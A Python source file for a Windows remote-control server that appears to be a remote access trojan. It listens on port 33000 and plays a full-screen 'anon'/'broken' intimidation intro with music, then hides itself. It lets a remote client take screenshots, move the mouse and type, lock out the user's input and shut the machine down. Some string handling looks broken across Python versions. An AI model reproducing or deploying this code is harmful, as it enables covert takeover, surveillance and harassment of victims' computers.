import wx
from ctypes import *
import socket
import datetime
from random import randint
import os
from threading import Thread
import win32api, win32con
import time
from PIL import ImageGrab
import win32com.client
import string
import pywintypes

def piltoimage(pil, alpha=True):  # Converts PIL image to wx.Image
    image = wx.EmptyImage(1920, 1080)
    new_image = pil.convert('RGB')
    data = new_image.tobytes()  # Updated to use tobytes() instead of tostring()
    image.SetData(data)
    return image

class Server(wx.Frame):
    
    def __init__(self, parent, title):
        super(Server, self).__init__(parent, title=title)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.shell = win32com.client.Dispatch("WScript.Shell")
        
        self.s.bind(('0.0.0.0', 33000))  # Bind socket to all interfaces on port 33000
        self.s.listen(1)
        print("Waiting for connection...")
        self.conn, address = self.s.accept()
        print("Connected")
        
        self.SetBackgroundColour((0, 0, 0))  # Set background color to black
        self.Maximize(True)  # Maximize window
        self.Show()
        
        self.music = wx.Sound("control.wav")  # Load background music
        self.music.Play(wx.SOUND_ASYNC)  # Play music asynchronously
        self.caps = False
        
        self.anon = wx.StaticBitmap(self, pos=(0, 0))  # Placeholder for anonymous image
        self.broken = wx.StaticBitmap(self, pos=(0, 0))
        
        self.t2 = Thread(target=self.intro)  # Thread for intro animation
        self.t2.start()
        
        self.t1 = Thread(target=self.recv)  # Thread for receiving data
        self.t1.start()

    def intro(self):  # Intro sequence
        time.sleep(23.8)
        self.w = "broken.jpg"
        self.broken.SetBitmap(wx.Bitmap(self.w))
        time.sleep(1)
        time.sleep(0.75)
        self.w = "background.jpg"
        self.anon.SetBitmap(wx.Bitmap(self.w))
        time.sleep(0.5)
        self.music.Stop()
        self.Hide()
 
    def recv(self):  # Receive data from client
        while True:
            self.data = self.conn.recv(10024)  # Receive data (up to 10 KB)
            
            if "screenshot" in self.data:  # If request for screenshot
                pilImage = ImageGrab.grab()  # Capture screen
                s = (piltoimage(pilImage)).GetData()  # Convert to wx.Image data
                self.conn.send(s)  # Send image data back to client
                
            else:
                if self.data[0:6] == "mouse:":  # Mouse event received
                    a = self.data.split("?")  # Split mouse event data
                    n = 0
                    while n < len(a):
                        pos = a[n].split(":")
                        if len(pos) == 3:
                            x = int(pos[1])
                            y = int(pos[2])
                            win32api.SetCursorPos((int(x), int(1.039 * y)))  # Set mouse cursor position
                        n += 1
                        
                else:
                    if 'keyboard:' in self.data:  # Keyboard event received
                        a = self.data.split(":")  # Split keyboard event data
                        b = a[1].split("?")[0]
                        self.SetFocus()
                        if b == '311':  # Handle CAPSLOCK toggle
                            self.caps = not self.caps
                        try:  # Send keypress
                            if not self.caps:
                                self.shell.SendKeys(chr(int(b)).lower())
                            else:
                                self.shell.SendKeys(chr(int(b)))
                        except:
                            pass  # Ignore exceptions
    
                if 'doubleClick' in self.data:  # Double-click event
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0)
                    
                if 'leftDown' in self.data:  # Mouse left button down
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0)
                    
                if 'leftUp' in self.data:  # Mouse left button up
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0)
                    
                if 'lock' in self.data:  # Lock input
                    windll.user32.BlockInput(True)
                    
                if 'unlock' in self.data:  # Unlock input
                    windll.user32.BlockInput(False)
                    
                if 'shutDown' in self.data:  # Shutdown command
                    os.system('shutdown -s')

                if 'exit' in self.data:  # Exit command
                    self.s.close()

if __name__ == '__main__':
    app = wx.App()
    Server(None, title='Center')
    app.MainLoop()
